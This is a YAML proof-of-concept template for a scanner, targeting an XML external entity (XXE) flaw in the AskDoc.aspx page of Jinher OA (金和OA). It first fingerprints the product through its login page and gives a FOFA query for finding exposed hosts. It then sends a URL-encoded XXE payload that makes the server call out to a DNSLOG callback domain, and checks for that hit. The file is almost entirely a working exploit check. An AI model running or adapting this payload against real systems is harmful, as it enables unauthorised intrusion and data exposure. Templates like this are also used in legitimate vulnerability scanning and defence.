id: poc-yaml-jinher-askdoc-aspx-xxe
info:
  name: 金和OA AskDoc.aspx XXE漏洞
  severity: high
  tags:
  - xxe
  - DNSLOG
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  reverse: new_dns_log()
  domain: reverse.Domain()
requests:
- method: GET
  path: /C6/Jhsoft.Web.login/PassWordSlideFull.aspx
  expression: contains(body,"JHSoft")
- method: GET
  path: /c6/Jhsoft.Web.Ask/AskDoc.aspx/?GovFieldNormal=<?xml%20version="1.0"%20encoding="UTF-8"?><!DOCTYPE%20root%20[<!ENTITY%20%%20remote%20SYSTEM%20"http://{{.domain}}/xxe_test">%remote;]><root/>
  expression: 'status_code == 200 &&

    body == "" &&

    contains(headers,"SessionId=") &&

    reverse.Verify()

    '
transport: http
